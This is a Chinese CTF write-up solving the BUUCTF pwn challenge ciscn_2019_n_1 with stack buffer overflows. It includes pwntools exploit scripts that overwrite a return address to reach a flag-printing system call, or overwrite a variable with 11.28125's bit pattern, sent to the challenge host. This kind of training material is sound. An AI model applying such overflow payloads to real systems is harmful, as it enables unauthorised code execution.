# BUUCTF-PWN-ciscn_2019_n_1

## 1.溢出到shell位置

下载文件

checksec



<img src="https://i-blog.csdnimg.cn/blog_migrate/b24665fa47871aa9509a12db45e0f333.png" alt="" style="max-height:220px; box-sizing:content-box;" />


file



<img src="https://i-blog.csdnimg.cn/blog_migrate/85e8bfe39a63b781ff3d8245c35197e3.png" alt="" style="max-height:122px; box-sizing:content-box;" />


发现是64位的 然后 放入ida

查看字符串



<img src="https://i-blog.csdnimg.cn/blog_migrate/bbec5e746f2ad322788436feedee5618.png" alt="" style="max-height:387px; box-sizing:content-box;" />


发现 cat flag

然后看看



F5反编译



<img src="https://i-blog.csdnimg.cn/blog_migrate/4c7bb0c2e607b86b2fe0030a36bd3361.png" alt="" style="max-height:443px; box-sizing:content-box;" />


我们发现了system 然后get()函数

我们可以使用栈溢出我们看看 v1函数的地址 是30h 然后是64位的 所以 基地址是8字节

我们开始查看 system的地址



<img src="https://i-blog.csdnimg.cn/blog_migrate/72eb5739c7681c4e6a5930842f177e8a.png" alt="" style="max-height:162px; box-sizing:content-box;" />


所以发现system的地址 开始写exp

```cobol
from pwn import *
p=remote('node4.buuoj.cn',27236)
payload = b'A'*(0x30+0x08)+p64(0x4006BE)
p.sendline(payload)
p.interactive()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/22146385c4b7c5e5b6415cda18598f58.png" alt="" style="max-height:547px; box-sizing:content-box;" />


得到

## 2.修改v2的值

我们需要知道在定义变量的时候是一段连续的距离 因为这个事全局变量 所以是在上面的

两个图来理解





<img src="https://i-blog.csdnimg.cn/blog_migrate/c7f0040cf9b35ec5b5147ac5773f3522.png" alt="" style="max-height:510px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/c58bc5835987f3b132cb86b2d4395b7a.png" alt="" style="max-height:747px; box-sizing:content-box;" />


这两个就能发现 v1和v2相差了 (0x30-0x04)

然后我们需要找到



<img src="https://i-blog.csdnimg.cn/blog_migrate/c85cdfc45472518539d020323e5170de.png" alt="" style="max-height:198px; box-sizing:content-box;" />




判断语句的11.28125在内存里的表达方式

在汇编里面能找到



<img src="https://i-blog.csdnimg.cn/blog_migrate/5d37fd873822723b4e76732baf7f6ae7.png" alt="" style="max-height:131px; box-sizing:content-box;" />


找到地址了

exp

本地

```cobol
from pwn import *
#p=process('./ciscn_2019_n_1')
payload=b'A'*(0x2c)+p64(0x41348000)
p.sendline(payload)
p.interactive()
 
 
 
 
```

远程

```cobol
from pwn import *
p=remote('node4.buuoj.cn',25149)
payload=b'A'*(0x2c)+p64(0x41348000)
p.sendline(payload)
p.interactive()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/11d91d7119036fb876cda5532666c5fc.png" alt="" style="max-height:278px; box-sizing:content-box;" />


同样可以得到